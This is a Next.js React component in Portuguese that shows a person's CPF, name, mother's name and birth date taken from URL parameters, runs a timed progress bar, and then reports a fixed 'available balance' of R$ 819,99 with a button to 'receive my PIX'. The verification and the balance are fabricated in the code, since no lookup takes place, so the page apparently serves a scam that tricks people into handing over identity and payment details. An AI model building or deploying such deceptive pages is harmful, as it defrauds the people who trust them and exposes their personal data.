'use client'
import { Button } from "@/components/ui/button";
import { useEffect, useState } from "react";
import { Progress } from "@/components/ui/progress";
import { useRouter, useSearchParams } from "next/navigation";
import { Loader2 } from "lucide-react";

export function Dados() {

  const params = useSearchParams()
  const router = useRouter()

  const [document] = useState<string>(params.get('document') ?? '')
  const [name] = useState<string>(params.get('name') ?? '')
  const [mae] = useState<string>(params.get('mae') ?? '')
  const [nasc] = useState<string>(params.get('nasc') ?? '')


  const [visible, setVisible] = useState(false)

  const [value, setValue] = useState(0)

  useEffect(() => {
    if (value === 100) {
      setVisible(true)
    }
    if (value < 100) {
      const interval = setInterval(() => {
        setValue((prev) => Math.min(prev + 1, 100))
      }, 40)
      return () => clearInterval(interval)
    }
  }, [value])


  return (
    <div className="space-y-10">
      <div className="space-y-4">
        <div className="text-sm text-center">
          Atenção, o cálculo dos valores está sendo realizado, isso pode levar alguns minutos!
        </div>
        <Progress className="h-4" value={value} />
        <p className="text-sm font-medium">Dados verificados com sucesso!</p>
        <div className="flex flex-col gap-2">

          <p className="text-sm truncate max-w-[300px]">
            <strong> CPF :</strong> {" "}{document}
          </p>

          <p className="text-sm truncate max-w-[300px]">
            <strong> Nome :</strong> {" "}{name}
          </p>

          <p className="text-sm truncate max-w-[300px]">
            <strong> Nome da mãe :</strong> {" "}{mae}
          </p>

          <p className="text-sm truncate max-w-[300px]">
            <strong> Data de nascimento :</strong> {" "}{nasc}
          </p>

          {
            !visible ? (
              <div className="flex items-center">
                <Loader2 className="size-5 mr-2 animate-spin" />
                <p className="animate-pulse text-sm">Verificando saldo...</p>
              </div>

            ) : (
              <div>
                <p className="text-xs font-light">Saldo disponível</p>
                <h2 className="text-xl font-semibold">R$ 819,99</h2>
              </div>
            )
          }

        </div>
      </div>
      {visible && (
        <div className="flex items-center gap-4 w-full">
          <Button onClick={() => router.push(`/onbording?document=${document}&name=${name}`)} className="w-full h-12 text-base rounded-3xl bg-[#1c7069]  hover:bg-[#1c7069]">
            Receber meu PIX
          </Button>
        </div>
      )}
    </div>

  )
}